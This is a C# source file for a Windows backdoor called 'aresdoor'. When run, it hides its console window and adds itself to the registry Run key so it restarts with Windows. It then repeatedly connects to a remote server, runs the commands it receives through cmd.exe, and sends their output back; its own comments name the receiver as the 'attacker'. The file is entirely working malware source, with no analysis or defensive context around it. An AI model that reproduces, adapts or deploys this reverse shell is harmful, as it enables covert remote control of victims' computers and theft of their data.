using System;

namespace aresdoor
{
    class Program
    {
        private static string shellcode_ = System.IO.Directory.GetCurrentDirectory() + "> ";
        private static byte[] shellcode = System.Text.Encoding.ASCII.GetBytes(shellcode_);

        private static string exec(string cmd)
        {
            System.Diagnostics.Process p = new System.Diagnostics.Process();
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = "/C " + cmd;
            p.Start();

            // To avoid deadlocks, always read the output stream first and then wait.
            string output = p.StandardOutput.ReadToEnd();
            p.WaitForExit();

            return output; // return output of command
        }

        private static bool checkInternetConn(string server)
        {
            using (System.Net.NetworkInformation.Ping pingSender = new System.Net.NetworkInformation.Ping())
            {
                System.Net.NetworkInformation.PingReply reply = pingSender.Send(server);
                return reply.Status == System.Net.NetworkInformation.IPStatus.Success ? true : false;
            }
        }

        private static void sendBackdoor(string server, int port)
        {
            try
            {
                System.Net.Sockets.TcpClient client = new System.Net.Sockets.TcpClient(server, port);
                System.Net.Sockets.NetworkStream stream = client.GetStream();

                while (true)
                {
                    // Send the message to the connected TcpServer. 
                    stream.Write(shellcode, 0, shellcode.Length); // Send Shellcode

                    // Buffer to store the response bytes.
                    byte[] data = new byte[256];

                    // String to store the response ASCII representation.
                    string responseData = "";

                    // Read the first batch of the TcpServer response bytes.
                    int bytes = stream.Read(data, 0, data.Length);
                    responseData = System.Text.Encoding.ASCII.GetString(data, 0, bytes);

                    if (responseData == "exit")
                    {
                        break;
                    }
                    else
                    {
                        byte[] output;
                        try { output = System.Text.Encoding.ASCII.GetBytes(exec(responseData)); } catch (Exception) { output = System.Text.Encoding.ASCII.GetBytes("Command couldn't execute."); }

                        try
                        {
                            stream.Write(output, 0, output.Length); // Send output of command back to attacker.
                        }
                        catch (System.IO.IOException)
                        {
                            stream.Close();
                            client.Close();
                            break;
                        }
                    }
                }

                // Close everything.
                stream.Close();
                client.Close();
            }
            catch (System.Net.Sockets.SocketException) { } // Pass socket connection silently.
        }
        
        private static void SetStartup()
        {
            Microsoft.Win32.RegistryKey rk = Microsoft.Win32.Registry.CurrentUser.OpenSubKey
                ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

            string currfile = System.Reflection.Assembly.GetExecutingAssembly().Location;
            rk.SetValue("aresdoor", currfile);
        }

        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE); // hide window

            SetStartup();

            while (true)
            {
                if (checkInternetConn("www.google.com") == true)
                {
                    try
                    {
                        sendBackdoor("localhost", 9000);
                    }
                    catch (Exception)
                    { } // pass silently
                    Console.WriteLine("another backdoor sent");
                } else
                {
                    Console.WriteLine("Internet Connection Failed.");
                }

                System.Threading.Thread.Sleep(10000); // sleep for 10 seconds before retrying
            }
        }

        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [System.Runtime.InteropServices.DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_SHOW = 1;
        const int SW_HIDE = 0;
    }
}
